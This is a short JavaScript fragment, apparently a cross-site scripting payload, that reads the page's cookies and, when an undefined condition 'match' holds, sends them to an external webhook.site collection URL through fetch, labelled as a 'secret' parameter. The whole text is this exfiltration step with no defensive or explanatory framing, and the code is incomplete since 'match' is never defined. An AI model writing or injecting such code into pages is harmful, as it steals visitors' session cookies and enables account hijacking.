var cookies = document.cookie;
if(match) {
    // Send to webhook
    fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?secret=' + cookies);
}
